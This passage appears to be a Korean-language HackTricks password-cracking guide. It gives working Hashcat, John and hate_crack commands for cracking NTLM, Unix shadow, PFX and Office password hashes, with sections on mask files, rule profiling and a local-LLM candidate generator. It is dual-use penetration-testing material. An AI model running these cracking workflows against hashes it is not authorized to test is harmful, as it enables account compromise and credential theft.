```

### PFX 인증서

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## 도구

**해시 예시:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Wordlists

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Wordlist Generation Tools**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 기본 문자, 키맵 및 경로를 설정할 수 있는 고급 keyboard-walk 생성기.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

_**/etc/john/john.conf**_을 읽고 설정합니다.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat 공격

- 규칙을 사용하는 **Wordlist 공격** (`-a 0`)

**Hashcat**에는 **규칙이 포함된 폴더**가 기본으로 제공되지만, [**여기에서 다른 유용한 규칙을 찾을 수 있습니다**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### 규칙 파일 설명 및 프로파일링

Hashcat 규칙은 opcode를 왼쪽에서 오른쪽 순서로 실행합니다. 연산이 위치 0에서 수행될 때는 쉽게 잘못 이해할 수 있습니다. `^e ^h ^t`는 `e`를 먼저, 그다음 `h`, 마지막으로 `t`를 앞에 추가하므로 `password`가 `thepassword`로 바뀝니다. 치환은 대소문자를 구분하는 바이트 비교이므로 `sa@`와 같은 규칙은 대문자 `A`에는 아무런 영향을 주지 않습니다. 익숙하지 않은 규칙은 GPU 시간을 들이기 전에 소문자, 대문자, 대소문자가 섞인 대표적인 기본 단어를 사용해 테스트하세요.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta)는 각 중간 후보를 보여주고 전체 규칙 파일의 opcode 분포를 요약할 수 있습니다. 정적 opcode 개수를 보면 파일에서 주로 문자를 뒤에 추가하는지, 앞에 추가하는지, 치환하는지, 잘라내는지 알 수 있습니다. 이것만으로 규칙이 비밀번호를 크랙할 수 있다고 단정할 수는 없지만, 대상 사용자 집단에서 관찰된 비밀번호 패턴에 맞는 규칙 세트를 선택하는 데 도움이 됩니다.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### debug 로그를 사용해 중복 규칙 줄이기

Hashcat debug mode는 규칙 변환 기록을 일반 상태 및 결과 출력과 별도로 저장합니다. 모드 `4`는 `baseword:rule:candidate`를 기록하고, 모드 `5`는 원본 wordlist를 덧붙입니다. 항상 `--debug-file`을 명시적으로 설정하세요. 그렇지 않으면 Hashcat은 프로필 디렉터리의 `hashcat.debugfile`을 열며, stdout을 리디렉션하면 이 기록이 아니라 콘솔 스트림이 캡처됩니다. debug 파일은 추가 모드로 열리므로 새 측정을 시작하기 전에 기존 파일을 삭제하거나 교체하고, 평문 baseword와 candidate가 포함되어 있으므로 파일을 안전하게 보호하세요.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

`frequency`를 사용해 가장 자주 적용되는 규칙을 찾고, `basewords`로 서로 다른 입력의 범위를 측정하며, `candidates`로 서로 다른 출력의 개수를 확인하세요. 자주 적용되는 규칙이라도 여러 입력을 중복 후보로 합칠 수 있으므로, 규칙을 줄이기 시작할 때는 일반적으로 후보 순위를 살펴보는 것이 가장 좋습니다. 가치가 가장 높은 규칙을 더 작은 파일에 복사하고, 남은 해시를 대상으로 다시 실행한 다음 실행 간 보고서를 비교하세요. Mode `5`는 각 소스 wordlist가 유용한 basewords를 얼마나 제공하는지도 보여줍니다. 데이터에 콜론이 있어 자동 감지가 모호해지면 `--debug-mode 4` 또는 `--debug-mode 5`를 사용해 파싱을 강제하세요.<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist 조합** 공격

hashcat을 사용하면 **2개의 wordlist를 하나로 조합**할 수 있습니다.\
첫 번째 목록에 **"hello"**라는 단어가 있고 두 번째 목록에 **"world"**와 **"earth"**라는 단어가 각각 한 줄씩 있다면, `helloworld`와 `helloearth`가 생성됩니다.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks (암호화된 Office 문서 예시)

암호가 길고 여러 문자 클래스를 포함하더라도, 알려진 문법을 따른다면 **유효 탐색 공간**은 작을 수 있습니다. 승인된 평가 중 입수한 암호화된 Office 문서의 경우, `office2john.py`는 암호 검증 레코드를 추출합니다. 이를 통해 온라인 잠금, 속도 제한 또는 MFA 없이 로컬에서 암호 추측을 수행할 수 있습니다. 이 도구는 문서 암호화를 우회하지 않습니다.<sup>[[2]](#references)[[5]](#references)</sup>

John이 앞에 붙이는 파일 이름 필드를 제거해 Hashcat에 검증자만 전달합니다:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

추출한 접두부를 기준으로 `-m`을 선택하고 파일 확장자를 기준으로 선택하지 마세요. Hashcat은 `$office$*2007*`, `$office$*2010*`, `$office$*2013*`을 각각 모드 `9400`, `9500`, `9600`에 매핑합니다. 이전 형식의 `$oldoffice$0/$1` 및 `$oldoffice$3/$4` 레코드는 각각 모드 `9700` 및 `9800`을 사용합니다.<sup>[[3]](#references)</sup>

비밀번호 재사용, 정책, 힌트 또는 사용자를 잘 아는 사람에게서 얻은 정보로 `<word><number><optional !><word>`와 같은 규칙을 파악했다면, 독립적으로 열거할 수 있는 접두부를 왼쪽 사전으로 만드세요. 이 예시에서는 숫자 `0`부터 `99`까지를 테스트합니다. 평가에서 얻은 근거에 따라 범위와 변환 규칙을 바꾸세요.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat 공격 모드 `1`은 오른쪽 사전의 각 줄을 왼쪽 사전의 각 줄 뒤에 추가하므로, `L`줄과 `R`줄이 들어 있는 파일은 적용된 rules 이전에 `L × R`개의 후보를 생성합니다. 다음 명령은 레거시 `$oldoffice$3/$4` 레코드 전용입니다. 다른 Office 형식에는 모드를 변경하세요.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

이 전처리 패턴은 오프라인에서 검증 가능한 다른 형식에도 적용할 수 있습니다. 전체 길이를 무작정 brute-force하는 대신, 한 구성 요소에 대해 가능성 있는 대문자화, 날짜, 구분자, 숫자 또는 구두점만 열거한 다음 나머지 구성 요소와 결합합니다.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### 실행 전에 `.hcmask` 파일 검증하기

잘못된 줄이 유효한 마스크 사이에 묻힐 수 있으므로, 공격을 시작하기 전에 파일 전체와 예상 keyspace를 검증하세요. HashcatRosetta는 마스크가 하나라도 잘못된 경우 오류가 발생한 줄을 보고하고 0이 아닌 상태 코드를 반환하므로, 스크립트나 CI에서 이 검사를 사용할 수 있습니다.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

일반적인 CSV 또는 텍스트 파서로 mask 파일을 정규화하지 마세요. Hashcat은 사용자 지정 charset `?1`부터 `?8`까지 지원하고, `#`가 첫 번째 바이트일 때만 주석으로 처리하며, `?` 토큰을 해석하기 전에 한 번에 백슬래시 이스케이프를 제거합니다. 따라서 `#` 앞의 공백은 mask 데이터이며, 이스케이프에 따라 시퀀스가 리터럴인지 charset 토큰인지 달라질 수 있습니다.<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) 공격

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### hate_crack을 이용한 대상 맞춤형 Hashcat 실행

[hate_crack](https://github.com/trustedsec/hate_crack)은 해시 파일을 준비하고 Hashcat 모드를 알고 있을 때 로컬에서 Hashcat 실행을 조율합니다. Hashcat 자체는 별도로 설치해야 합니다. 서브모듈을 포함해 clone한 뒤 `make`를 실행하고 대화형 세션을 시작하세요. 예시 모드 `1000`은 NTLM용이지 보편적인 기본값이 아닙니다. 기존 clone은 PCFG 및 PRINCE-LING 옵션을 사용하기 전에 `git submodule update --init --recursive`를 실행해야 합니다.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**복구된 평문에서 문법을 학습합니다.** 먼저 사전/규칙을 적용하고, 대상과 관련된 평문으로 `pcfg_cracker`를 학습시킵니다. `config.json`에서 `pcfgRuleset`을 학습한 ruleset으로 설정한 뒤, PCFG(메뉴 `20`)를 선택해 가능성 높은 구조를 Hashcat으로 스트리밍하거나, PRINCE-LING(`21`)을 선택해 문법 기반 PRINCE 베이스 목록을 만듭니다. `pcfgMaxCandidates`와 `pcfgPrinceLingMaxCandidates`로 두 생성기의 범위를 제한하세요. hate_crack은 문법을 대신 학습해 주지 않습니다. PCFG는 [조합 예제](#grammar-driven-combinator-attacks-encrypted-office-example)의 고정 문법과 달리, 기본 단어 뒤에 숫자와 기호가 오는 구조와 같은 패턴의 확률을 학습합니다.<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**알려진 비밀번호에서 규칙을 역으로 추론합니다.** Spoonman(메뉴 `22`)은 현재 세션의 비어 있지 않은 `.out` 파일을 포함한 평문 코퍼스를 받아, 관측된 비밀번호를 재구성하는 소문자 기본 단어와 Hashcat 규칙을 도출합니다. 코퍼스의 비밀번호 중 재현하는 개수에 따라 규칙의 순위를 매깁니다. 먼저 상위 50% 커버리지 티어부터 시작하고, 추가 키스페이스가 타당할 때만 범위를 넓히세요. 변형 규칙보다 누락된 어간 때문에 커버리지가 제한될 때는 도출한 기본 단어를 다른 관련 단어 목록과 결합하세요. Hashcat 규칙은 함수가 최대 31개이며, 위치 알파벳은 인덱스 `0`–`35`만 지정할 수 있습니다. 비밀번호를 인코딩할 수 없는 경우 Spoonman은 리터럴 기본 단어와 no-op 규칙을 사용합니다. 매우 큰 코퍼스에서는 제한된 메모리 카운터의 상한에 도달할 수 있으므로, 완전히 재구성된다고 가정하지 말고 보고된 커버리지를 확인하세요. 결과를 독립적으로 재사용하기 전에 [Hashcat rule behavior](#explain-and-profile-rule-files)를 참조하세요.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**확보한 증거에 맞는 생성기를 선택합니다.** OMEN (`13`)은 비밀번호 목록에서 문자 전이 모델을 학습하고, `omenMaxCandidates`로 제한되는 후보를 확률 순서대로 열거합니다. Markov brute force (`15`)는 대신 현재 `.out`에서 복구한 비밀번호나 선택한 목록으로 `.hcstat2` 테이블을 만들고, 증분 길이 범위를 테스트할 수 있습니다. 대상에 대한 정보가 비밀번호가 아닌 산문 형태라면 N-gram (`16`)에 gzip 입력을 포함한 코퍼스를 전달해 `ngramX.bin`을 생성합니다. 기본 그룹 크기는 3입니다. 이들은 서로 다른 대안이며, 동일한 후보 목록을 세 번 만드는 방식이 아닙니다.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**작고 그럴듯한 후보 풀만 확장합니다.** Permutation (`17`)은 입력 단어의 모든 문자를 재배열하므로, 8자 단어 하나만으로도 `8!`개의 순열이 생성됩니다. Combipow (`19`)는 짧은 패스프레이즈 단어 풀에서 비어 있지 않은 부분집합 조합을 출력합니다. `-s`는 공백을 삽입하며, 입력 줄이 63개를 초과하면 도구가 거부합니다. Combinator (`6`)는 `--sepFill`을 사용해 여러 단어 목록을 구분자로 이어 붙일 수 있습니다. 일반적인 두 목록 연결은 위의 [native Hashcat combinator](#hashcat-attacks)에서 다룹니다.<sup>[[13]](#references)[[14]](#references)</sup>

**피드백 공격의 비용을 관리합니다.** Fingerprint (`5`)는 매 라운드마다 전체 코퍼스를 다시 확장하는 대신, 새로 복구된 비밀번호를 조각 길이를 늘려 가며 반복적으로 확장합니다. 조합 키스페이스 임계값을 초과하면 규모가 너무 큰 `-a 1` 패스를 건너뜁니다. Hybrid (`7`)는 더 넓은 `?a` 접두사/접미사 마스크를 적용하기 전에 비용이 적게 드는 `?s?d` 장식을 시도하며, `hcatHybridMaxRuntime`이 실행 시간을 제한합니다. 하이브리드 패스의 비용은 단어 목록 크기에 마스크 공간을 곱한 값이므로, 큰 목록에 넓은 마스크를 적용하면 초기 패스보다 훨씬 큰 비용이 들 수 있습니다.<sup>[[13]](#references)[[14]](#references)</sup>

**복구된 비밀번호에서 로컬 LLM으로 후보를 생성합니다.** 초기 패스에서 비어 있지 않은 `<hashfile>.out`이 생성된 뒤, hate_crack의 LLM 공격(메인 메뉴 `12`, **복구된 비밀번호** 하위 메뉴 `3`)은 대상별 기본 단어, 연도, 접미사, 대소문자 표기 방식을 추론한 다음 새 후보를 Hashcat에 전달할 수 있습니다. 작은 코퍼스에서는 복구된 평문을 모델 프롬프트에 포함할 수 있지만, 큰 코퍼스는 통계로 요약됩니다. 이 방식은 위의 고정된 [rules](#explain-and-profile-rule-files)나 [masks](#hashcat-attacks)를 그대로 반복하는 데 그치지 않고, 관측된 규칙성을 일반화합니다.<sup>[[13]](#references)[[14]](#references)</sup>

hate_crack의 `.env`에서 이미 제공 중인 로컬 Ollama 모델을 설정하세요. 모델을 자동으로 가져오지는 않습니다. `OLLAMA_NO_CLOUD=true`로 설정하면 cloud 태그가 붙은 모델과 외부 endpoint 주소를 거부합니다. localhost endpoint만으로는 충분하지 않습니다. Ollama가 `-cloud` 모델을 원격으로 프록시할 수 있고, 프롬프트에 복구된 평문이나 코퍼스 통계가 포함될 수 있습니다. 이 설정은 사설 네트워크 endpoint는 여전히 허용하며 전송 경로의 프록시를 차단하지 못하므로, 클라이언트 데이터를 보내기 전에 추론 경로를 확인하세요.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

더 큰 예산을 투입하기 전에 더 저렴한 rule, mask, target-trained 패스와 후보 생성 효과를 비교하세요. 모델은 추측 후보를 생성하고, Hashcat은 여전히 이를 해시와 대조합니다.<sup>[[13]](#references)[[14]](#references)</sup>

#### Hashcat 모드

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Linux 해시 크래킹 - /etc/shadow 파일

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Windows 해시 크래킹

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

일반적인 애플리케이션 해시 크래킹

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```



## References

- [1] [Inside GoBruteforcer: AI가 생성한 서버 기본 설정, 취약한 비밀번호, 암호화폐 중심 캠페인](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashcat 예제 해시 및 Microsoft Office 모드](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [자격 증명 상속 계획](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [HashcatRosetta 저장소](https://github.com/bandrel/HashcatRosetta)
- [7] [Hashcat 디버그 파일 구현](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Hashcat 명령줄 도움말](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: 비밀번호 크래킹의 로제타석 읽기](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [PCFG Cracker 저장소 및 사용법](https://github.com/lakiw/pcfg_cracker)
- [11] [OMEN 저장소 및 사용자 가이드](https://github.com/RUB-SysSec/OMEN)
- [12] [Spoonman 원본 이슈 및 규칙 도출 설계](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [hate_crack 저장소 및 공격 문서](https://github.com/trustedsec/hate_crack)
- [14] [hate_crack 2.0 이후의 새로운 기능](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [hate_crack LLM 전송 정책](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
- [16] [bkcrack 사용법](https://github.com/kimci86/bkcrack/blob/master/readme.md)
- [17] [bkcrack 알려진 평문 튜토리얼](https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md)
{{#include ../banners/hacktricks-training.md}}
